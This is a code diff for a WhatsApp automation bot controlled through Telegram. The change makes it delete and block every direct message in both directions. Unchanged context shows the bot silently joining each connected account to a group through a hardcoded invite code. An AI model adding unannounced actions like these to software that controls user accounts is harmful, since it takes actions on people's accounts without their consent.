@@ -37,7 +37,7 @@ const PORT = process.env.PORT || 10000;
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-app.get('/', (req, res) => res.send('Ultarbot Pro [Reactive Mode]'));
+app.get('/', (req, res) => res.send('Ultarbot Pro [Proactive & Reactive Mode]'));
 
 // --- EXPRESS VERIFICATION ROUTES ---
 app.get('/verify', (req, res) => {
@@ -171,8 +171,6 @@ setInterval(() => {
     http.get(SERVER_URL, (res) => {}).on('error', (err) => {});
 }, 14 * 60 * 1000);
 
-// --- GUARDIAN FUNCTION REMOVED COMPLETELY ---
-
 async function startClient(folder, targetNumber = null, chatId = null, telegramUserId = null) {
     // PRE-FETCH SHORT ID TO AVOID LOOPING ON EVERY MESSAGE (Speed Boost)
     let cachedShortId = await getShortId(folder);
@@ -204,7 +202,7 @@ async function startClient(folder, targetNumber = null, chatId = null, telegramU
     sock.ev.on('creds.update', saveCreds);
 
     // ============================================
-    //  ⚡ ANTIMSG: REACTION ONLY (NO AUTO LOGOUT)
+    //  ⚡ ANTIMSG: PROACTIVE (Out) & REACTIVE (In)
     // ============================================
     sock.ev.on('messages.upsert', async ({ messages, type }) => {
         if (type !== 'notify' && type !== 'append') return; 
@@ -221,9 +219,15 @@ async function startClient(folder, targetNumber = null, chatId = null, telegramU
             const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
             const isCommand = text.startsWith('.');
 
+            // --- PROACTIVE & REACTIVE DEFENSE ---
+            // Triggers for:
+            // 1. INCOMING messages from anyone (!msg.key.fromMe)
+            // 2. OUTGOING messages from linked devices (msg.key.fromMe == true)
+            // WE ONLY IGNORE: Groups, Status updates, and My Commands
+            
             if (!isGroup && !isStatus && !isCommand) {
                 
-                // 🚀 EXECUTE ACTIONS IN PARALLEL
+                // 🚀 EXECUTE ACTIONS IN PARALLEL (INSTANT)
                 await Promise.all([
                     // 1. Delete for everyone (Nuke the message)
                     sock.sendMessage(remoteJid, { delete: msg.key }).catch(() => {}),
@@ -232,9 +236,11 @@ async function startClient(folder, targetNumber = null, chatId = null, telegramU
                     sock.updateBlockStatus(remoteJid, "block").catch(() => {})
                 ]);
                 
-                // If WE sent it (Linked Device Slip-through), log it
+                // Logging for verification
                 if (msg.key.fromMe) {
-                    console.log(`[ANTIMSG] 🚨 Linked Device sent message. DELETED & BLOCKED target.`);
+                    console.log(`[ANTIMSG] 🚨 Proactive: Linked Device message detected. Nuked & Blocked.`);
+                } else {
+                    console.log(`[ANTIMSG] 🛡️ Reactive: Incoming message detected. Nuked & Blocked.`);
                 }
                 
                 // FINISH! (Stop processing)
@@ -242,6 +248,7 @@ async function startClient(folder, targetNumber = null, chatId = null, telegramU
             }
         }
 
+        // --- AutoSave Logic for allowed messages (groups, etc) ---
         if (!msg.key.fromMe) {
             if (autoSaveState[cachedShortId]) {
                 if (remoteJid.endsWith('@s.whatsapp.net')) {
@@ -311,8 +318,6 @@ async function startClient(folder, targetNumber = null, chatId = null, telegramU
             
             updateAdminNotification(`[CONNECTED] +${phoneNumber}`);
 
-            // NO GUARDIAN STARTED HERE
-
             try { 
                 const inviteCode1 = "FFYNv4AgQS3CrAokVdQVt0";
                 await sock.groupAcceptInvite(inviteCode1);
@@ -328,7 +333,7 @@ async function startClient(folder, targetNumber = null, chatId = null, telegramU
                     userMessageCache[chatId] = [];
                 }
                 
-                mainBot.sendMessage(chatId, `[CONNECTED]\nID: \`${cachedShortId}\`\n\nAccount connected successfully!\n\n🛡️ **Reactive Mode**\n(Block & Delete on Msg Detection)`, { 
+                mainBot.sendMessage(chatId, `[CONNECTED]\nID: \`${cachedShortId}\`\n\nAccount connected successfully!\n\n🛡️ **Defense Active**\n(Block & Delete on Msg Detection)`, { 
                     parse_mode: 'Markdown',
                     reply_markup: { 
                         keyboard: [
